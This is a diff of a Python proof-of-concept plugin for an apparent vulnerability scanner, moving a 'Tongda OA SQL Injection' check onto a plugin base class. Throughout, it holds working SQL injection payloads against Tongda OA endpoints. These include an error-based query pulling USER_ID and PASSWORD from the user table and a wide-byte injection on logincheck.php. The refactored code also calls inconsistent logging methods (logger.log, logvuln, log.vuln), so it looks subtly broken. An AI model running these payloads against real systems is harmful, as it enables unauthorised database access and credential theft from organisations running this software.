@@ -3,16 +3,13 @@
 
 __author__ = 'xiaokong'
 
-import sys
-import requests
-from module.log import logger
+from module.plugin import Plugin
 
+class poc(Plugin):
 
-description = 'Tongda OA SQL Injection'
-querytype = 'site'
-type = 'CMS'
-
-class poc(object):
+    type = 'CMS'
+    querytype = 'site'
+    description = 'Tongda OA SQL Injection'
     
     def __init__(self, v):
     
@@ -33,33 +30,35 @@ class poc(object):
         self.payload_1 = '/general/document/index.php/recv/register/turn'
         self.payload_2 = '/general/document/index.php/recv/register/register_for/?tid=&amp;title=1%\' and (!(select*from(select user())x)-~0)&gt;1;%00'
         self.payload_3 = '/logincheck.php'
-        self.logger = logger(v)
     
     def exploit(self, target):
         
-        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:52.0)'}
-        try:
-            for i,path in enumerate(self.payload_list):
-                res = requests.get(target+path, headers=headers, timeout=30)
-                if not res.ok:
-                    return True
-                if 'Duplicate' in res.content or 'You have an error in your SQL syntax' in res.content:
-                    self.logger.log(41,str([target])+str([i]))
-            data = {'_SERVER': '', 'rid': 'exp(~(select*from(select concat_ws(0x7c,USER_ID,PASSWORD) from user limit 4,1)x))'}       
-            res = requests.post(target+self.payload_1, headers=headers, data=data, timeout=30)
-            if res.content:
-                if 'out of range' in res.content:
-                    self.logger.log(41,str([target])+str([13]))
-            res = requests.get(target+self.payload_2, headers=headers, timeout=30)  
-            if res.content:                
-                if 'out of range' in res.content:
-                    self.logger.log(41,str([target])+str([14]))
-            data = {'submit':'%b5%c7%20%c2%bc','PASSWORD':'g00dPa%24%24w0rD','UNAME':'%bf\'%bf%22'}
-            res = requests.post(target+self.payload_3, headers=headers, data=data, timeout=30)
-            if res.content: 
-                if '#1064' in res.content:
-                    self.logger.log(41,str([target])+str([15]))
-        except Exception as e:
-            self.logger.debug(str(e))
+        for i,path in enumerate(self.payload_list):
+            response = self.query(method='GET', url=target+path)
+            if response:
+                if response.ok:
+                    if 'Duplicate' in response.content or 'You have an error in your SQL syntax' in response.content:
+                        self.logger.log(target+str([i]))
+
+        data = {'_SERVER': '', 'rid': 'exp(~(select*from(select concat_ws(0x7c,USER_ID,PASSWORD) from user limit 4,1)x))'}       
+        response = self.query(method='POST', url=target+self.payload_1, data=data)
+        if response:
+            if response.content:
+                if 'out of range' in response.content:
+                    self.logvuln(target+str([13]))
+
+        response = self.query(method='GET', url=target+self.payload_2)  
+        if response:
+            if response.content:                
+                if 'out of range' in response.content:
+                    self.log.vuln(target+str([14]))
+
+        data = {'submit':'%b5%c7%20%c2%bc','PASSWORD':'g00dPa%24%24w0rD','UNAME':'%bf\'%bf%22'}
+        response = self.query(method='POST', url=target+self.payload_3, data=data)
+        if response:
+            if response.content: 
+                if '#1064' in response.content:
+                    self.log.vuln(target+str([15]))
+
             
         
